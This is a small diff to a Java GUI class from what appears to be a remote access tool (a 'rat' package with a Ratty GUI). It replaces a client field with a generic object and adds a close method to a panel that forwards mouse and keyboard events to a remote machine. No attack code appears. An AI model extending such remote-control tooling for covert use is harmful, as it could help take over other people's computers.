@@ -19,7 +19,7 @@ import de.sogomn.rat.util.FrameEncoder.IFrame;
 
 public final class DisplayPanel extends AbstractListenerContainer<IGuiController> implements IMouseListener, IKeyboardListener {
 	
-	private ServerClient client;
+	private Object userObject;
 	
 	private String title;
 	private Screen screen;
@@ -35,8 +35,8 @@ public final class DisplayPanel extends AbstractListenerContainer<IGuiController
 	public static final String KEY_EVENT = "Key event";
 	public static final String CLOSED = "Closed";
 	
-	public DisplayPanel(final ServerClient client) {
-		this.client = client;
+	public DisplayPanel(final Object userObject) {
+		this.userObject = userObject;
 	}
 	
 	private Screen createScreen(final int screenWidth, final int screenHeight) {
@@ -44,7 +44,7 @@ public final class DisplayPanel extends AbstractListenerContainer<IGuiController
 		final WindowAdapter windowAdapter = new WindowAdapter() {
 			@Override
 			public void windowClosing(final WindowEvent w) {
-				notifyListeners(controller -> controller.userInput(CLOSED, client));
+				notifyListeners(controller -> controller.userInput(CLOSED, userObject));
 			}
 		};
 		final BufferedImage[] icons = RattyGui.GUI_ICONS.stream().toArray(BufferedImage[]::new);
@@ -111,7 +111,7 @@ public final class DisplayPanel extends AbstractListenerContainer<IGuiController
 		
 		lastMouseEventPacket = new MouseEventPacket(x, y, buttonEvent, type);
 		
-		notifyListeners(controller -> controller.userInput(MOUSE_EVENT, client));
+		notifyListeners(controller -> controller.userInput(MOUSE_EVENT, userObject));
 	}
 	
 	@Override
@@ -130,7 +130,13 @@ public final class DisplayPanel extends AbstractListenerContainer<IGuiController
 		
 		lastKeyEventPacket = new KeyEventPacket(key, type);
 		
-		notifyListeners(controller -> controller.userInput(KEY_EVENT, client));
+		notifyListeners(controller -> controller.userInput(KEY_EVENT, userObject));
+	}
+	
+	public void close() {
+		if (screen != null) {
+			screen.close();
+		}
 	}
 	
 	public void setTitle(final String title) {
